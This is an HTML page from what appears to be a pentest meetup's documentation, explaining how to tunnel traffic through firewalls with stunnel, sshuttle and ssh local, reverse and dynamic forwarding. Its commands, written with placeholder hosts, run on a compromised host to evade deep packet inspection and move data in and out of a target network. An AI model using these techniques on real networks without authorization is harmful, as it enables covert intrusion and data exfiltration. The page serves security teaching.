@@ -1,0 +1,492 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>6.16. Tunneling Traffic &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="6. Pentest Network Tools" href="../pentest_network_tools.html"/>
+        <link rel="next" title="6.17. Web Goat" href="webgoat.html"/>
+        <link rel="prev" title="6.15. tcpdump &amp; tcpflow" href="tcpdump_tcpflow.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="aircrack-ng.html">6.1. aircrack-ng</a></li>
+<li class="toctree-l2"><a class="reference internal" href="beef.html">6.2. BeEF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="burp_suite.html">6.3. Burp Suite and ZAP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="curl.html">6.4. curl</a></li>
+<li class="toctree-l2"><a class="reference internal" href="drive_droid_kon-boot.html">6.5. DriveDroid &amp; Kon-Boot</a></li>
+<li class="toctree-l2"><a class="reference internal" href="mana.html">6.6. mana</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nmap.html">6.7. nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="openvas.html">6.8. OpenVAS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="pcredz.html">6.9. Pcredz pcap credentials</a></li>
+<li class="toctree-l2"><a class="reference internal" href="hak5_pineapple.html">6.10. Hak5 Pineapple</a></li>
+<li class="toctree-l2"><a class="reference internal" href="proxychains.html">6.11. Proxy Chains</a></li>
+<li class="toctree-l2"><a class="reference internal" href="responder.html">6.12. Responder</a></li>
+<li class="toctree-l2"><a class="reference internal" href="socat.html">6.13. <code class="docutils literal"><span class="pre">socat</span></code> vs (<code class="docutils literal"><span class="pre">nc</span></code> vs <code class="docutils literal"><span class="pre">ncat</span></code> vs <code class="docutils literal"><span class="pre">netcat</span></code>)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="sqlmap.html">6.14. sqlmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="tcpdump_tcpflow.html">6.15. tcpdump &amp; tcpflow</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">6.16. Tunneling Traffic</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#stunnel-ssl-tls-tunneling">6.16.1. <code class="docutils literal"><span class="pre">stunnel</span></code> SSL/TLS Tunneling</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#sshuttle-ssh-vpn">6.16.2. <code class="docutils literal"><span class="pre">sshuttle</span></code> ssh VPN</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#ssh-tunneling-support">6.16.3. <code class="docutils literal"><span class="pre">ssh</span></code> Tunneling Support</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#l-local-port-forwarding">6.16.3.1. “-L” Local Port Forwarding</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#r-remote-forwarding">6.16.3.2. “-R” Remote Forwarding</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#d-dynamic-forwarding">6.16.3.3. “-D” Dynamic Forwarding</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="webgoat.html">6.17. Web Goat</a></li>
+<li class="toctree-l2"><a class="reference internal" href="wireshark.html">6.18. Wireshark</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xsscrapy.html">6.19. xsscrapy</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_network_tools.html">6. Pentest Network Tools</a> &raquo;</li>
+        
+      <li>6.16. Tunneling Traffic</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/network_tools/tunneling_traffic.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="tunneling-traffic">
+<h1>6.16. Tunneling Traffic<a class="headerlink" href="#tunneling-traffic" title="Permalink to this headline">¶</a></h1>
+<p>The idea is to hide traffic.  To avoid firewall deep packet inspection you can use a tunneling protocol where a (permitted) delivery protocol encapsulates a (hidden) payload protocol: e.g. https delivery protocol encapsulating ssh payload protocol.</p>
+<div class="section" id="stunnel-ssl-tls-tunneling">
+<h2>6.16.1. <code class="docutils literal"><span class="pre">stunnel</span></code> SSL/TLS Tunneling<a class="headerlink" href="#stunnel-ssl-tls-tunneling" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="https://www.stunnel.org/docs.html">stunnel</a> can hide most TCP traffic using SSL/TLS, effectively looking like https traffic. Here we illustrate this following <a class="reference external" href="http://ubuntu-tutorials.com/2013/11/27/tunnel-ssh-over-ssl/">Tunnel SSH over SSL</a> where SSL/TLS is the delivery protocol and ssh is the payload protocol. The remote attacker’s machine requires: (1) installing the <code class="docutils literal"><span class="pre">stunnel4</span></code> package, (2) generating a tunnel key, (3) specifying the listening local ip:port (STUNNEL_ENDPOINT:443), and (4) specifying the desired destination host:port (DESTINATION:22). The local client side requires: (1) installing the <code class="docutils literal"><span class="pre">stunnel4</span></code> package, (2) downloading the tunnel cert, (3) specifying the listening local ip:port (here 2200), (4) specifying the remote tunnel ip:port (STUNNEL_ENDPOINT:443), and (5) starting the <code class="docutils literal"><span class="pre">stunnel4</span></code> service on the port. And of course these host modifications will be caught by any decent host-based intrusion detection system, making it difficult to do clandestinely.</p>
+<img src="../_images/graphviz-e71e11cfe582ce29789e10e7483a8ca2a5588252.png" alt="digraph {
+  node [shape=box]; FIREWALL;
+  node [shape=ellipse];
+      subgraph inside {
+          rank = same;
+          {node [label=&quot;INTERNALHOST\nssh external_user&#64;COMPROMISEDHOST -p 2200&quot;]; INTERNALHOST;}
+          {node [label=&quot;COMPROMISEDHOST\naccept COMPROMISEDHOST:2200\nconnect STUNNEL_ENDPOINT:443&quot;]; COMPROMISEDHOST;}
+      }
+      subgraph outside {
+          rank = same;
+          {node [label=&quot;STUNNEL_ENDPOINT\naccept STUNNEL_ENDPOINT:443\nconnect DESTINATION:22&quot;]; STUNNEL_ENDPOINT;}
+          {node [label=&quot;DESTINATION\nsshd port 22&quot;]; DESTINATION;}
+      }
+        INTERNALHOST -&gt; COMPROMISEDHOST [label=&quot;port 2200\nssh&quot;];
+        COMPROMISEDHOST -&gt; FIREWALL [label=&quot;port 443\nssh inside ssl&quot;];
+        FIREWALL -&gt; STUNNEL_ENDPOINT [label=&quot;port 443\nssh inside ssl&quot;];
+        STUNNEL_ENDPOINT -&gt; DESTINATION [label=&quot;port 22\nssh&quot;]
+}" />
+</div>
+<div class="section" id="sshuttle-ssh-vpn">
+<h2>6.16.2. <code class="docutils literal"><span class="pre">sshuttle</span></code> ssh VPN<a class="headerlink" href="#sshuttle-ssh-vpn" title="Permalink to this headline">¶</a></h2>
+<p>From <a class="reference external" href="https://github.com/apenwarr/sshuttle">sshuttle: where transparent proxy meets VPN meets ssh</a>: “Transparent proxy server that works as a poor man’s VPN. Forwards over ssh. Doesn’t require admin. Works with Linux and MacOS. Supports DNS tunneling.”</p>
+<p>Actually, <code class="docutils literal"><span class="pre">sshuttle</span></code> requires root access on the local machine. If routing is enabled on the local machine it can forward the entire subnet to the VPN.</p>
+<p>The advantages of <code class="docutils literal"><span class="pre">sshuttle</span></code> over <code class="docutils literal"><span class="pre">ssh</span> <span class="pre">-L</span></code> are: (1) it doesn’t need a ssh port forward for every single host/port on the remote network, (2) better performance due to not running TCP over TCP, and (3) you can forward DNS to the remote server.</p>
+<p><code class="docutils literal"><span class="pre">sshuttle</span></code> command line options to consider:</p>
+<blockquote>
+<div><table class="docutils option-list" frame="void" rules="none">
+<col class="option" />
+<col class="description" />
+<tbody valign="top">
+<tr><td class="option-group">
+<kbd><span class="option">-D</span>, <span class="option">--daemon</span></kbd></td>
+<td>fork into background after connecting to remote server</td></tr>
+</tbody>
+</table>
+<dl class="docutils">
+<dt>-l, –listen=[ip:]port</dt>
+<dd>specify the ip &amp; port as a transparent proxy (vs. default to 127.0.0.1:port for some random port). If non-default and want to route from local network, make sure kernal IP forwarding is enabled. If you’re not routing you don’t need to specify this argument.</dd>
+</dl>
+<p class="attribution">&mdash;dns
+capture local DNS requests and forward to the remote DNS server</p>
+</div></blockquote>
+<blockquote>
+<div><table class="docutils option-list" frame="void" rules="none">
+<col class="option" />
+<col class="description" />
+<tbody valign="top">
+<tr><td class="option-group" colspan="2">
+<kbd><span class="option">-N</span>, <span class="option">--auto-nets</span></kbd></td>
+</tr>
+<tr><td>&#160;</td><td>ask server for subnets we should route</td></tr>
+</tbody>
+</table>
+<dl class="docutils">
+<dt>-r, –remote=[username&#64;]sshserver[:port]</dt>
+<dd>connect to this remote server</dd>
+<dt>&lt;subnets&gt;</dt>
+<dd>subnets to route over the VPN (e.g. 0/0)</dd>
+</dl>
+</div></blockquote>
+<p>Here’s an example: <code class="docutils literal"><span class="pre">sudo</span> <span class="pre">sshuttle</span> <span class="pre">--dns</span> <span class="pre">-vvr</span> <span class="pre">sshuser&#64;sshserver</span> <span class="pre">0/0</span></code> which sets up a VPN for all addresses through <code class="docutils literal"><span class="pre">ssh</span></code> to sshserver showing very verbose logging.</p>
+</div>
+<div class="section" id="ssh-tunneling-support">
+<h2>6.16.3. <code class="docutils literal"><span class="pre">ssh</span></code> Tunneling Support<a class="headerlink" href="#ssh-tunneling-support" title="Permalink to this headline">¶</a></h2>
+<p>There are 3 kinds of <code class="docutils literal"><span class="pre">ssh</span></code> tunnels: (1) “-L” local port forwarding, (2) “-R” reverse tunnel, and (3) “-D” dynamic port forwarding (or “SOCKS”-ifying any protocol). View <a class="reference external" href="http://vimeo.com/54505525">The Black Magic Of SSH / SSH Can Do That?</a> for a good, long video about <code class="docutils literal"><span class="pre">ssh</span></code> tunneling and more.</p>
+<p>In all 3 cases we use 5 hosts: INTERNALHOST &lt;–&gt; COMPROMISEDHOST &lt;–&gt; FIREWALL &lt;–&gt; SSHHOST &lt;–&gt; REMOTEHOST. (Note: The FIREWALL is optional and there to note that we’re sneaking data in/out of the pen test target. And generally the INTERNALHOST and COMPROMISEDHOST can be the same, as can the SSHHOST and REMOTEHOST.) In all 3 cases the <code class="docutils literal"><span class="pre">ssh</span> <span class="pre">[-L,-R,-D]</span></code> command is run on the COMPROMISEDHOST and the ssh tunnel runs between COMPROMISEDHOST &lt;–&gt; FIREWALL &lt;–&gt; SSHHOST. The “-L” and “-D” options send traffic from the COMPROMISEDHOST outbound through the firewall, while the “-R” (for reverse) sends traffic inbound to the COMPROMISEDHOST side of the FIREWALL.</p>
+<p>Note that the tunneled traffic between INTERNALHOST &lt;–&gt; REMOTEHOST need not be <code class="docutils literal"><span class="pre">ssh</span></code>. To illustrate this we use http for the “-D” option, but for the “-L” and “-R” cases we illustrate using <code class="docutils literal"><span class="pre">ssh</span></code> traffic tunneled.</p>
+<p>While the COMPROMISEDHOST &lt;–&gt; FIREWALL &lt;–&gt; SSHHOST tunnel is encrypted by <code class="docutils literal"><span class="pre">ssh</span></code>, the other traffic legs are only encrypted if the tunneled protocol is encrypted. So parts of the http traffic are not encrypted (as you would expect).</p>
+<div class="section" id="l-local-port-forwarding">
+<h3>6.16.3.1. “-L” Local Port Forwarding<a class="headerlink" href="#l-local-port-forwarding" title="Permalink to this headline">¶</a></h3>
+<p>This case tunnels traffic from anywhere inside the firewall through the COMPROMISEDHOST &lt;–&gt; FIREWALL &lt;–&gt; SSHHOST tunnel to a fixed REMOTEHOST. Below we show tunneling <code class="docutils literal"><span class="pre">ssh</span></code> through the <code class="docutils literal"><span class="pre">ssh</span></code> tunnel, though we could just as well forwarded http or https or … .</p>
+<p><code class="docutils literal"><span class="pre">ssh</span> <span class="pre">-fNT</span> <span class="pre">sshuser&#64;SSHHOST</span> <span class="pre">-L</span> <span class="pre">[localbindaddress:]localport:REMOTEHOST:remoteport</span></code> arguments are:</p>
+<blockquote>
+<div><table class="docutils option-list" frame="void" rules="none">
+<col class="option" />
+<col class="description" />
+<tbody valign="top">
+<tr><td class="option-group">
+<kbd><span class="option">-f<var>NT</var></span></kbd></td>
+<td><p class="first">-f places ssh in background before command execution.</p>
+<p>-N prevents opening a remote command (just forward ports).</p>
+<p class="last">-T disables pseudo-tty allocation.</p>
+</td></tr>
+</tbody>
+</table>
+<dl class="docutils">
+<dt>-L [localbindaddress:]localport:REMOTEHOST:remoteport</dt>
+<dd><p class="first">Bind to “localbindaddress:localport” on the local machine. The default localbindaddress is 127.0.0.1.</p>
+<p class="last">At the SSHHOST forward the data to REMOTEHOST:remoteport. (So REMOTEHOST:remoteport = localhost:22 would forward the data to 127.0.0.1:22 on the SSHHOST, not the local host where the ssh command is executed.)</p>
+</dd>
+<dt><a class="reference external" href="mailto:sshuser&#37;&#52;&#48;SSHHOST">sshuser<span>&#64;</span>SSHHOST</a></dt>
+<dd>ssh to server at SSHHOST as sshuser.</dd>
+</dl>
+</div></blockquote>
+<p>Here goes an example forwarding <code class="docutils literal"><span class="pre">ssh</span></code> through a firewall to a bad_host:</p>
+<img src="../_images/graphviz-748508ed5117b19864911276c6949b0797092a2b.png" alt="digraph {
+  node [shape=box]; FIREWALL;
+  node [shape=ellipse];
+      subgraph inside {
+          rank = same;
+          {node [label=&quot;INTERNALHOST\nssh remoteuser&#64;COMPROMISEDHOST -p 2200&quot;]; INTERNALHOST;}
+          {node [label=&quot;COMPROMISEDHOST\nssh -fNT sshuser&#64;SSHHOST\n     -L COMPROMISEDHOST:2200:REMOTEHOST:22&quot;]; COMPROMISEDHOST;}
+      }
+      subgraph outside {
+          rank = same;
+          {node [label=&quot;SSHHOST\nrun normal sshd&quot;]; SSHHOST;}
+          {node [label=&quot;REMOTEHOST\nrun normal sshd&quot;]; REMOTEHOST;}
+      }
+        INTERNALHOST -&gt; COMPROMISEDHOST [label=&quot;port 2200\nssh&quot;];
+        COMPROMISEDHOST -&gt; FIREWALL [label=&quot;port 22\nssh inside ssh&quot;];
+        FIREWALL -&gt; SSHHOST [label=&quot;port 22\nssh inside ssh&quot;];
+        SSHHOST -&gt; REMOTEHOST [label=&quot;port 22\nssh&quot;]
+}" />
+<p>Again we note these host modifications will be caught by any decent host-based intrusion detection system, making it difficult to do clandestinely.</p>
+</div>
+<div class="section" id="r-remote-forwarding">
+<h3>6.16.3.2. “-R” Remote Forwarding<a class="headerlink" href="#r-remote-forwarding" title="Permalink to this headline">¶</a></h3>
+<p>This case tunnels traffic from anywhere outside the firewall through the SSHHOST &lt;–&gt; FIREWALL &lt;–&gt; COMPROMISEDHOST tunnel to a fixed INTERNALHOST. Below we show tunneling <code class="docutils literal"><span class="pre">ssh</span></code> through the <code class="docutils literal"><span class="pre">ssh</span></code> tunnel, though we could just as well forwarded http or https or … .</p>
+<p><code class="docutils literal"><span class="pre">ssh</span> <span class="pre">-fNT</span> <span class="pre">sshuser&#64;SSHHOST</span> <span class="pre">-R</span> <span class="pre">[SSHHOST:]sshhostport:INTERNALHOST:internalport</span></code> arguments are:</p>
+<blockquote>
+<div><table class="docutils option-list" frame="void" rules="none">
+<col class="option" />
+<col class="description" />
+<tbody valign="top">
+<tr><td class="option-group">
+<kbd><span class="option">-f<var>NT</var></span></kbd></td>
+<td><p class="first">-f places ssh in background before command execution.</p>
+<p>-N prevents opening a remote command (just forward ports).</p>
+<p class="last">-T disables pseudo-tty allocation.</p>
+</td></tr>
+</tbody>
+</table>
+<dl class="docutils">
+<dt>-R [SSHHOST:]sshhostport:INTERNALHOST:internalport</dt>
+<dd><p class="first">Bind to “SSHHOST:sshhostport” on the SSHHOST machine. “-L” did the binding on the local machine but here we’re binding on the external <code class="docutils literal"><span class="pre">ssh</span></code> tunnel end.</p>
+<p class="last">At the local host forward the data to INTERNALHOST:internalport. (So INTERNALHOST:internalport = localhost:22 would forward the data to 127.0.0.1:22 on the local host where the ssh command is run.)</p>
+</dd>
+<dt><a class="reference external" href="mailto:sshuser&#37;&#52;&#48;SSHHOST">sshuser<span>&#64;</span>SSHHOST</a></dt>
+<dd>ssh to server at host SSHHOST as sshuser.</dd>
+</dl>
+</div></blockquote>
+<p>Here goes an example remote forwarding <code class="docutils literal"><span class="pre">ssh</span></code> through a firewall from a REMOTEHOST:</p>
+<img src="../_images/graphviz-5e3ddb97d32619a0501ab0c3145cb6107f9ad9ae.png" alt="digraph {
+  node [shape=box]; FIREWALL;
+  node [shape=ellipse];
+      subgraph inside {
+          rank = same;
+          {node [label=&quot;INTERNALHOST\nrun normal sshd&quot;]; INTERNALHOST;}
+          {node [label=&quot;COMPROMISEDHOST\nssh -fNT sshuser&#64;SSHHOST\n     -R SSHHOST:2200:INTERNALHOST:22&quot;]; COMPROMISEDHOST;}
+      }
+      subgraph outside {
+          rank = same;
+          {node [label=&quot;SSHHOST\nrun sshd\n/etc/ssh/sshd_config 'GatewayPorts yes'&quot;]; SSHHOST;}
+          {node [label=&quot;REMOTEHOST\nssh -p 2200 internaluser&#64;SSHHOST&quot;]; REMOTEHOST;}
+      }
+        COMPROMISEDHOST -&gt; INTERNALHOST [label=&quot;port 22\nssh&quot;];
+        FIREWALL-&gt;  COMPROMISEDHOST [label=&quot;port 22\nssh inside ssh&quot;];
+        SSHHOST -&gt; FIREWALL [label=&quot;port 22\nssh inside ssh&quot;];
+        REMOTEHOST -&gt; SSHHOST [label=&quot;port 2200\nssh&quot;]
+}" />
+<p>Again we note these host modifications will be caught by any decent host-based intrusion detection system, making it difficult to do clandestinely.</p>
+</div>
+<div class="section" id="d-dynamic-forwarding">
+<h3>6.16.3.3. “-D” Dynamic Forwarding<a class="headerlink" href="#d-dynamic-forwarding" title="Permalink to this headline">¶</a></h3>
+<p>Dynamic port forwarding turns the COMPROMISEDHOST into a SOCKS server. This case tunnels SOCKS traffic from anywhere inside the firewall through the COMPROMISEDHOST &lt;–&gt; FIREWALL &lt;–&gt; SSHHOST tunnel to any REMOTEHOST (it’s not fixed in this case). Below we show tunneling http through the <code class="docutils literal"><span class="pre">ssh</span></code> tunnel, knowing it’s unencrypted outside the <code class="docutils literal"><span class="pre">ssh</span></code> tunnel.</p>
+<p><code class="docutils literal"><span class="pre">ssh</span> <span class="pre">-fNT</span> <span class="pre">sshuser&#64;SSHHOST</span> <span class="pre">-D</span> <span class="pre">[bind_address:]port</span></code> with arguments:</p>
+<blockquote>
+<div><table class="docutils option-list" frame="void" rules="none">
+<col class="option" />
+<col class="description" />
+<tbody valign="top">
+<tr><td class="option-group">
+<kbd><span class="option">-f<var>NT</var></span></kbd></td>
+<td><p class="first">-f places ssh in background before command execution.</p>
+<p>-N prevents opening a remote command (just forward ports).</p>
+<p class="last">-T disables pseudo-tty allocation.</p>
+</td></tr>
+</tbody>
+</table>
+<dl class="docutils">
+<dt>-D [bind_address:]port</dt>
+<dd>Bind to “bind_address:port” on the local machine. Act as a SOCKS server tunneling the data through to the remote host.</dd>
+<dt><a class="reference external" href="mailto:sshuser&#37;&#52;&#48;SSHHOST">sshuser<span>&#64;</span>SSHHOST</a></dt>
+<dd>ssh to server at host SSHHOST as sshuser.</dd>
+</dl>
+</div></blockquote>
+<p>Here goes an example setting up the COMPROMISEDHOST as a SOCKS server for outbound http traffic (using the <code class="docutils literal"><span class="pre">curl</span></code> command):</p>
+<img src="../_images/graphviz-015c3291240ff1da773f101f788a74f2a3991118.png" alt="digraph {
+  node [shape=box]; FIREWALL;
+  node [shape=ellipse];
+      subgraph inside {
+          rank = same;
+          {node [label=&quot;INTERNALHOST\ncurl -socks5-hostname COMPROMISEDHOST:9001 \nhttp://REMOTEHOST/bad_page.html&quot;]; INTERNALHOST;}
+          {node [label=&quot;COMPROMISEDHOST\nssh -fNT user&#64;SSHHOST -D 9001&quot;]; COMPROMISEDHOST;}
+      }
+      subgraph outside {
+          rank = same;
+          {node [label=&quot;SSHHOST\nrun normal sshd&quot;]; SSHHOST;}
+          {node [label=&quot;REMOTEHOST\nhttp server&quot;]; REMOTEHOST;}
+      }
+        INTERNALHOST -&gt; COMPROMISEDHOST [label=&quot;port 9001\nsocks5&quot;];
+        COMPROMISEDHOST -&gt; FIREWALL [label=&quot;port 22&quot;];
+        FIREWALL -&gt; SSHHOST [label=&quot;port 22&quot;];
+        SSHHOST -&gt; REMOTEHOST [label=&quot;port 80\nhttp&quot;]
+}" />
+<p>Again we note these host modifications will be caught by any decent host-based intrusion detection system, making it difficult to do clandestinely.</p>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="webgoat.html" class="btn btn-neutral float-right" title="6.17. Web Goat" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="tcpdump_tcpflow.html" class="btn btn-neutral" title="6.15. tcpdump &amp; tcpflow" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
